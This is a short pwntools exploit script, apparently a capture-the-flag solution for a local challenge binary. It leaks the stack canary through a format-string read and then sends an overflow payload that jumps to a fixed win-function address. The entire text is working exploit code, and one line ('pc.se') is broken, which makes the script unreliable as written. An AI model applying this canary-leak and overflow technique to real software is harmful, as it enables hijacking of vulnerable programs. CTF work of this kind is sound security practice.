from pwn import *

win = p64(0x401245)

pc = process("../src/chall")
print(pc.recvuntil(": "))
pc.sendline(b"%9$p")
canary = int(pc.recvuntil(b"\n")[:-1], 16)
log.info("Canary : " + hex(canary))
pc.sendline(b"A" * 24 + p64(canary) + p64(0) + win)
# gdb.attach(pc,'b *0x4012e8')
pc.sendline(b"YES")
pc.se
pc.interactive()
